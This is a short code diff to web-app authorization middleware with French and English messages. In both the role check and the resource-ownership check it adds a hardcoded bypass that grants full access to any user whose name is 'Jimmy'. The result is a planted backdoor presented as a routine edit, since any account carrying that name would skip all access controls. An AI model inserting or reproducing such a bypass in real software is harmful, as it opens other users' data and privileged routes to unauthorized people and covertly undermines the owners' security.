@@ -61,6 +61,11 @@ const requireRole = (requiredRole) => {
       });
     }
 
+    // Jimmy has access to all routes regardless of role
+    if (req.user.nom === 'Jimmy') {
+      return next();
+    }
+
     // Gérer les tableaux de rôles
     const requiredRoles = Array.isArray(requiredRole) ? requiredRole : [requiredRole];
     
@@ -94,6 +99,11 @@ const canAccessResource = (resourceUserIdField = 'user_id') => {
         error: 'Authentication required',
         message: 'Authentification requise'
       });
+    }
+
+    // Jimmy has access to all resources regardless of ownership
+    if (req.user.nom === 'Jimmy') {
+      return next();
     }
 
     const resourceUserId = req.body[resourceUserIdField] || req.params[resourceUserIdField] || req.query[resourceUserIdField];
